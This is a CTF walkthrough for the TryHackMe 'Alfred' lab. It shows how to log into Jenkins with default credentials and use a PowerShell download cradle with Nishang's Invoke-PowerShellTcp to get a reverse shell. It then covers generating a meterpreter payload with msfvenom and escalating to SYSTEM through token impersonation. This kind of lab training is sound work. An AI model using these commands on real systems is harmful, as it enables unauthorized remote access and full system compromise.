# Alfred Walkthrough 
<br/>

## Intro
Welcome into the Alfred challenge, here is the link to the [room](https://tryhackme.com/r/room/alfred) on TryHackMe website.
This is part of the Offensive Security path and this time we are gonna practice exploiting *Jenkins* (an automation CI/CD server) and Windows tokens.

"*Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

*Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.*"

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

 Let's begin!

<br/>
<br/>

## The Challenge
Let's begin as always with a port scan using *nmap*:
```bash
nmap -Pn -sV MACHINE_IP
```

We find out there are some interesting open ports:
```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

By navigating to `http://MACHINE_IP` in the browser we can see a landing page saying "Rip Bruce Wayne".

Let's move now to the Jenkins server at `http://MACHINE_IP:8080`, here we are asked for credentials to log-in, luckly looks like the admin didn't changed the default ones and we can login using `admin:admin`.

Now is time to look for a way to execute commands.
Looking around to the different functionalities, it seems that Here we can run Windows commands: `http://10.10.201.161:8080/job/project/configure`; scroll down and you should see the `whoami` command, we are gonna replace it with our own.

Since the task told us to use *Nishang* shell, we can either clone the repository or just download the PowerShell script: `Invoke-PowerShellTcp.ps1`.
Once the file is on your machine we need to make it available for download, so we can transfer it to the target, in the directory where the file is located we can start a simple HTTP server using Python modules:
```bash
python3 -m http.server
```

Now run this on the website to get the reverse shell on the machine:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port 1234
```

One last thing to set up is a listener on our machine:
```bash
nc -lvnp 1234
```

Then save the project, go to the dashboard and build -> run the project, in a couple of second you should get the shell.

Now we need to find and submit the user flag, lets navigate to `C:\Users\bruce\Desktop` and run:
```powershell
type user.txt
```

<br/>

### Switching Shells
We are then told to use *msfvenom* to generate a file to gain a new shell using the command:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```

This payload generates an encoded x86-64 reverse TCP meterpreter payload.

After creating this payload, create a new HTTP server and download it to the target:
On your machine:
```bash
python3 -m http.server
```

On target:
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```

Before running this program, ensure the handler is set up in Metasploit:
```bash
msfconsole
```
```bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
```

﻿This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell
```powershell
Start-Process "shell-name.exe"
```

This should spawn a meterpreter shell for you!

<br/>

### Privilege Escalation
Now that we have initial access, let's use token impersonation to gain system access.

A bit of theory from THM
Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:
- User SIDs(security identifier)
- Group SIDs
- Privileges

There are two types of access tokens:
- **Primary access tokens**: those associated with a user account that are generated on log on
- **Impersonation tokens**: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:
- *SecurityAnonymous*: current user/client cannot impersonate another user/client
- *SecurityIdentification*: current user/client can get the identity and privileges of a client but cannot impersonate the client
- *SecurityImpersonation*: current user/client can impersonate the client's security context on the local system
- *SecurityDelegation*: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

With this info lets run on the target:
```powershell
whoami/priv
```

We get:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

We can see that two privileges : **SeDebugPrivilege, SeImpersonatePrivilege** are enabled.

Now run `exit` to close the shell, in meterpreter we can now execute: `load incognito` to load the module, then run this to see the available tokens:
```bash
list_tokens -g
```

Since the _BUILTIN\Administrators_ token is available. Use the `impersonate_token “BUILTIN\Administrators”` command to impersonate the Administrators token.

Finally let's migrate to a stable process, firstly still in meterpreter use `ps` to view them, located the right one run:
```
migrate 668
```

Now pop again the shell with `shell`, navigate to `C:\Windows\System32\config` and read the root.txt file:
```powershell
type root.txt
```

<br/>

Congratulations you have successfully exploited this Windows machine and practiced with the Metasploit framework.

Catch you in the next CTF 😃 
